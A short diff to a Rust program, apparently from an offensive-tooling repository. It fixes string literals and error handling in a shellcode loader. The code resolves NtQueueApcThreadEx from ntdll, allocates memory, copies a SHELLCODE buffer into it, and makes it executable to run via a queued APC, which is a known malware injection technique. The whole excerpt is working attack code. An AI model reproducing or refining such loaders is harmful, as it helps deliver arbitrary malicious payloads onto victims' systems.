@@ -18,25 +18,23 @@ fn main() {
     let mut old = PAGE_READWRITE;
 
     unsafe {
-        let ntdll = LoadLibraryA("ntdll.dll\0".as_ptr());
+        let ntdll = LoadLibraryA(b"ntdll.dll\0".as_ptr());
 
-        let fn_nt_queue_apc_thread_ex = GetProcAddress(ntdll, "NtQueueApcThreadEx\0".as_ptr());
+        let fn_nt_queue_apc_thread_ex = GetProcAddress(ntdll, b"NtQueueApcThreadEx\0".as_ptr());
 
         let nt_queue_apc_thread_ex: extern "C" fn(HANDLE, isize, *mut c_void, isize, isize, isize) =
             transmute(fn_nt_queue_apc_thread_ex);
 
         let dest = VirtualAlloc(null(), SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
         if dest.is_null() {
-            eprintln!("VirtualAlloc failed!");
-            return;
+            panic!("VirtualAlloc failed!");
         }
 
         copy(SHELLCODE.as_ptr(), dest.cast(), SIZE);
 
         let res = VirtualProtect(dest, SIZE, PAGE_EXECUTE, &mut old);
         if res == FALSE {
-            eprintln!("VirtualProtect failed!");
-            return;
+            panic!("VirtualProtect failed!");
         }
 
         let handle = GetCurrentThread();
